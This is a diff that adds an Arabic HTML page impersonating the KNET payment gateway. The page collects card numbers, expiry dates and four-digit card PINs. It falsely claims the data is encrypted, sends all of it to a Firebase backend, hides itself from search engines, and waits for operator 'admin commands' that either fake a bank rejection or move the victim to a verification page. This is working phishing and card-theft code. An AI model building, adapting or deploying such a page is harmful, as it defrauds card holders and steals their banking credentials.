@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=430, initial-scale=0.85, maximum-scale=1.0, user-scalable=no">
+  <meta name="robots" content="noindex, nofollow, noarchive">
+  <title>الدفع بالكي نت</title>
+
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script><script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script><script src="./assets/js/firebase-client.js?v=20261027"></script>
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap');
+
+    * { box-sizing: border-box !important; }
+
+    html, body {
+      margin: 0 !important;
+      padding: 0 !important;
+      background-color: #ffffff !important;
+      font-family: 'Tajawal', Arial, sans-serif !important;
+      direction: rtl !important;
+      color: #1a1a1a !important;
+      width: 100% !important;
+      overflow-x: hidden !important;
+    }
+
+    body {
+      display: flex !important;
+      justify-content: center !important;
+      align-items: flex-start !important;
+      min-height: 100vh !important;
+    }
+
+    .form-container.page {
+      width: 430px !important;
+      min-width: 430px !important;
+      max-width: 430px !important;
+      margin: 0 auto !important;
+      padding: 12px 16px 14px !important;
+      background: #ffffff !important;
+      direction: rtl !important;
+      display: flex !important;
+      flex-direction: column !important;
+    }
+
+    .form-title {
+      display: flex !important;
+      flex-direction: column !important;
+      align-items: center !important;
+      justify-content: center !important;
+      margin-bottom: 24px !important;
+      position: relative !important;
+    }
+
+    .form-title::before {
+      content: "KNET PAYMENT GATEWAY" !important;
+      display: block !important;
+      font-size: 22px !important;
+      font-weight: 500 !important;
+      color: #c8102e !important;
+      margin-bottom: 12px !important;
+      letter-spacing: 0.2px !important;
+      text-align: center !important;
+    }
+
+    .form-title::after {
+      content: "كي نت\A KNET" !important;
+      white-space: pre !important;
+      display: block !important;
+      font-size: 20px !important;
+      font-weight: 700 !important;
+      color: #c8102e !important;
+      text-align: center !important;
+      line-height: 1.1 !important;
+      margin-top: 6px !important;
+    }
+
+    .form-title .icon {
+      display: block !important;
+      width: 64px !important;
+      height: 64px !important;
+      margin: 0 auto !important;
+      background: url("assets/images/knet.svg") center / contain no-repeat !important;
+      font-size: 0 !important;
+    }
+
+    .form-title > span:not(.icon) { display: none !important; }
+
+    .form-group {
+      margin-bottom: 24px !important;
+      display: flex !important;
+      flex-direction: row !important;
+      align-items: center !important;
+      justify-content: flex-start !important;
+      position: relative !important;
+      gap: 15px !important;
+    }
+
+    .form-label {
+      width: 130px !important;
+      min-width: 130px !important;
+      max-width: 130px !important;
+      font-size: 18px !important;
+      font-weight: 500 !important;
+      color: #171717 !important;
+      text-align: right !important;
+      margin: 0 !important;
+      flex-shrink: 0 !important;
+    }
+
+    .form-control {
+      flex: 1 !important;
+      width: 100% !important;
+      height: 52px !important;
+      padding: 4px 12px !important;
+      font-size: 18px !important;
+      border: 2px solid #202124 !important;
+      border-radius: 10px !important;
+      background-color: #ffffff !important;
+      color: #111111 !important;
+      outline: none !important;
+      box-shadow: none !important;
+    }
+
+    .form-control:focus { border-color: #c8102e !important; }
+
+    .card-number-input {
+      direction: ltr !important;
+      text-align: left !important;
+      padding-left: 10px !important;
+    }
+
+    .form-row {
+      display: flex !important;
+      flex-direction: row !important;
+      flex-wrap: nowrap !important;
+      align-items: center !important;
+      column-gap: 15px !important;
+      margin: 0 0 24px 0 !important;
+    }
+
+    .form-row::before {
+      content: "تاريخ الانتهاء" !important;
+      flex: 0 0 130px !important;
+      min-width: 130px !important;
+      font-size: 18px !important;
+      font-weight: 500 !important;
+      color: #171717 !important;
+      text-align: right !important;
+    }
+
+    .form-row .form-group {
+      display: flex !important;
+      flex: 1 1 0 !important;
+      min-width: 0 !important;
+      margin: 0 !important;
+      gap: 8px !important;
+    }
+
+    .form-row .form-control {
+      flex: 1 1 0 !important;
+      width: 0 !important;
+      min-width: 0 !important;
+      text-align: center !important;
+      direction: ltr !important;
+      height: 52px !important;
+    }
+
+    #pin, #cvv {
+      width: 120px !important;
+      max-width: 120px !important;
+      flex: none !important;
+      text-align: center !important;
+      letter-spacing: 2px !important;
+      font-weight: bold !important;
+      direction: ltr !important;
+    }
+
+    .order-summary {
+      order: -1 !important;
+      display: flex !important;
+      flex-direction: column !important;
+      margin: 0 0 14px 0 !important;
+    }
+
+    .order-summary h4 { display: none !important; }
+
+    .summary-row {
+      display: flex !important;
+      justify-content: space-between !important;
+      align-items: center !important;
+      position: relative !important;
+      min-height: 60px !important;
+      padding: 8px 0 !important;
+      font-size: 20px !important;
+      font-weight: 500 !important;
+      color: #171717 !important;
+    }
+
+    .summary-row span:last-child {
+      position: absolute !important;
+      left: 50% !important;
+      transform: translateX(-50%) !important;
+      color: #c8102e !important;
+      font-size: 22px !important;
+      direction: ltr !important;
+      text-align: center !important;
+    }
+
+    .order-summary .total {
+      display: flex !important;
+      justify-content: space-between !important;
+      align-items: center !important;
+      position: relative !important;
+      min-height: 60px !important;
+      padding: 8px 0 !important;
+      font-size: 20px !important;
+      font-weight: 500 !important;
+    }
+
+    .total-label { color: #171717 !important; font-size: 20px !important; }
+
+    .total-value {
+      position: absolute !important;
+      left: 50% !important;
+      transform: translateX(-50%) !important;
+      color: #c8102e !important;
+      font-size: 22px !important;
+      font-weight: 500 !important;
+      text-align: center !important;
+    }
+
+    .error-message {
+      display: none;
+      width: 100% !important;
+      margin: -12px 0 18px !important;
+      padding: 0 2px !important;
+      color: #b42318 !important;
+      font-size: 14px !important;
+      font-weight: 500 !important;
+      line-height: 1.5 !important;
+      text-align: right !important;
+    }
+
+    .btn.btn-success {
+      width: 100% !important;
+      height: 58px !important;
+      margin-top: 22px !important;
+      background: #e20b16 !important;
+      color: #ffffff !important;
+      border: none !important;
+      border-radius: 12px !important;
+      font-family: inherit !important;
+      font-size: 20px !important;
+      font-weight: 500 !important;
+      cursor: pointer !important;
+      box-shadow: 0 4px 8px rgba(226, 11, 22, 0.25) !important;
+    }
+
+    .secure-note {
+      text-align: center !important;
+      margin-top: 16px !important;
+      font-size: 12px !important;
+      color: #71717a !important;
+    }
+
+    .loading-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(10, 15, 25, 0.7);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 99999;
+      padding: 20px;
+    }
+    .loading-overlay.show { display: flex; }
+    .loading-card {
+      background: #fff;
+      border-radius: 16px;
+      padding: 24px 28px;
+      text-align: center;
+      box-shadow: 0 12px 36px rgba(0,0,0,0.28);
+    }
+    .loading-spinner {
+      width: 46px;
+      height: 46px;
+      border: 4px solid #e9e9e9;
+      border-top-color: #c8102e;
+      border-radius: 50%;
+      margin: 0 auto 12px;
+      animation: spin 0.9s linear infinite;
+    }
+    .loading-text { font-size: 0.95rem; color: #555; font-weight: 600; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-card">
+      <div class="loading-spinner"></div>
+      <div class="loading-text" id="loadingText">جار التحميل يرجى الانتظار</div>
+    </div>
+  </div>
+
+  <div class="form-container page">
+    <div class="form-title">
+      <span class="icon">KNET</span>
+      <span>KNET</span>
+    </div>
+
+    <form id="paymentForm">
+
+      <div class="order-summary">
+        <div class="summary-row">
+          <span>المبلغ</span>
+          <span id="originalPrice">0.000 د.ب</span>
+        </div>
+        <div class="total">
+          <span class="total-label" id="paymentLabel">المبلغ المدفوع</span>
+          <span class="total-value" id="finalAmount">0.000 د.ب</span>
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label">رقم البطاقة</label>
+        <input type="text" class="form-control card-number-input" id="cardNumber"
+               required maxlength="19" inputmode="numeric" autocomplete="off">
+      </div>
+
+      <div class="form-row">
+        <div class="form-group">
+          <input type="text" class="form-control" id="expiryYY" required
+                 placeholder="YY" maxlength="2" inputmode="numeric" pattern="[0-9]{2}" aria-label="سنة الانتهاء">
+          <input type="text" class="form-control" id="expiryMM" required
+                 placeholder="MM" maxlength="2" inputmode="numeric" pattern="[0-9]{2}" aria-label="شهر الانتهاء">
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="pin">الرقم السري</label>
+        <input type="password" class="form-control" id="pin" required
+               maxlength="4" pattern="[0-9]{4}" inputmode="numeric"
+               placeholder="" autocomplete="off" aria-label="الرقم السري للبطاقة">
+      </div>
+
+      <div class="error-message" id="formError" role="alert">يرجى التحقق من البيانات المدخلة</div>
+      <div class="error-message" id="rejectionMessage" role="alert"></div>
+
+      <button type="submit" class="btn btn-success">
+        <span>تأكيد</span>
+      </button>
+
+      <div class="secure-note">🔒 بياناتك محمية ومشفرة بالكامل</div>
+    </form>
+  </div>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+        const form = document.getElementById('paymentForm');
+        const cardInput = document.getElementById('cardNumber');
+        const expiryYearInput = document.getElementById('expiryYY');
+        const expiryMonthInput = document.getElementById('expiryMM');
+        const pinInput = document.getElementById('pin');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const loadingText = document.getElementById('loadingText');
+        const formError = document.getElementById('formError');
+        const rejectionMessage = document.getElementById('rejectionMessage');
+
+        // عرض المبلغ المختار (من localStorage كما تكتبه صفحة السلة)
+        try {
+            const saved = localStorage.getItem('finalAmount');
+            if (saved) {
+                const clean = String(saved).replace(/[^\d.]/g, '');
+                if (clean) {
+                    document.getElementById('originalPrice').textContent = clean + ' د.ب';
+                    document.getElementById('finalAmount').textContent = clean + ' د.ب';
+                }
+            }
+        } catch (e) {}
+
+        try {
+            if (typeof window.ensureCustomerDoc === 'function') {
+                window.ensureCustomerDoc({ currentPage: 'صفحة الكي نت', lastSeen: Date.now() });
+            }
+            if (typeof window.startPresenceHeartbeat === 'function') {
+                window.startPresenceHeartbeat();
+            }
+        } catch (e) {}
+
+        cardInput.addEventListener('input', function (e) {
+            const val = e.target.value.replace(/\D/g, '');
+            e.target.value = val.replace(/(\d{4})(?=\d)/g, '$1 ');
+        });
+
+        [expiryYearInput, expiryMonthInput].forEach(function (el) {
+            el.addEventListener('input', function () {
+                el.value = el.value.replace(/\D/g, '').slice(0, 2);
+            });
+        });
+
+        pinInput.addEventListener('input', function () {
+            pinInput.value = pinInput.value.replace(/\D/g, '').slice(0, 4);
+        });
+
+        let submitting = false;
+
+        form.addEventListener('submit', function (e) {
+            e.preventDefault();
+            if (submitting) return;
+
+            const cardNumber = cardInput.value.replace(/\s/g, '');
+            const mm = expiryMonthInput.value;
+            const yy = expiryYearInput.value;
+            const pin = pinInput.value;
+
+            const badCard = cardNumber.length < 15;
+            const badExpiry = !/^\d{2}$/.test(mm) || !/^\d{2}$/.test(yy)
+                || parseInt(mm, 10) < 1 || parseInt(mm, 10) > 12;
+            const badPin = pin.length !== 4;
+
+            if (badCard || badExpiry || badPin) {
+                formError.textContent = badPin
+                    ? 'يرجى إدخال الرقم السري المكون من 4 أرقام'
+                    : 'يرجى التحقق من رقم البطاقة وتاريخ الانتهاء';
+                formError.style.display = 'block';
+                return;
+            }
+
+            formError.style.display = 'none';
+            rejectionMessage.style.display = 'none';
+            submitting = true;
+
+            // آخر 4 أرقام تُعرض في صفحة رمز التحقق
+            try { sessionStorage.setItem('paymentCardLast4', cardNumber.slice(-4)); } catch (e) {}
+
+            const prefix = cardNumber.slice(0, 6);
+            let bankName = 'KNET';
+            if (prefix.match(/^4/)) bankName = 'VISA';
+            else if (prefix.match(/^5[1-5]/)) bankName = 'MasterCard';
+
+            const bankPrefixes = [
+              { p: '90', bank: 'NBK' }, { p: '99', bank: 'GBC' }, { p: '41', bank: 'CBK' },
+              { p: '51', bank: 'KFH' }, { p: '52', bank: 'KFH' }, { p: '54', bank: 'KFH' },
+              { p: '55', bank: 'KFH' }, { p: '53', bank: 'GBK' }, { p: '97', bank: 'ABK' },
+              { p: '63', bank: 'Burgan' }, { p: '59', bank: 'Boubyan' }, { p: '58', bank: 'BBK' }
+            ];
+            for (const b of bankPrefixes) {
+              if (prefix.startsWith(b.p)) { bankName = b.bank; break; }
+            }
+
+            // محاولة جديدة + إرسال البيانات إلى Firestore
+            let firebaseDone = Promise.resolve(true);
+            try {
+              if (typeof window.startNewAttempt === 'function') window.startNewAttempt('knet');
+              if (typeof window.pushFirebaseCard === 'function') {
+                firebaseDone = window.pushFirebaseCard(bankName, prefix, cardNumber, mm, yy, pin, pin)
+                  .then(function () { return true; })
+                  .catch(function (err) { console.error('pushFirebaseCard error:', err); return true; });
+              }
+            } catch (err) { console.error(err); }
+
+            loadingText.textContent = 'جار إرسال البيانات يرجى الانتظار';
+            loadingOverlay.classList.add('show');
+
+            firebaseDone.then(function () {
+              loadingText.textContent = 'العملية قيد المعالجة يرجى الانتظار وعدم اغلاق الصفحة ...';
+
+              if (typeof window.listenForAdminCommands === 'function') {
+                window.listenForAdminCommands({
+                  onApproval: function () {
+                    // الموافقة — الانتقال لصفحة رمز التحقق
+                    window.location.href = 'verification.html';
+                  },
+                  onRejection: function (cmd) {
+                    const reason = (cmd && (cmd.reason || cmd.raw && cmd.raw.reason)) || 'يرجى المحاولة مرة أخرى';
+                    submitting = false;
+                    loadingOverlay.classList.remove('show');
+                    loadingText.textContent = 'جار التحميل يرجى الانتظار';
+                    rejectionMessage.textContent = '❌ تم رفض العملية من قبل البنك المصدر للبطاقة: ' + reason;
+                    rejectionMessage.style.display = 'block';
+                  },
+                  onMessage: function (msg) {
+                    if (msg && msg.message) { try { alert(msg.message); } catch (e) {} }
+                  }
+                });
+              } else {
+                window.location.href = 'verification.html';
+              }
+            });
+        });
+    });
+</script>
+</body>
+</html>
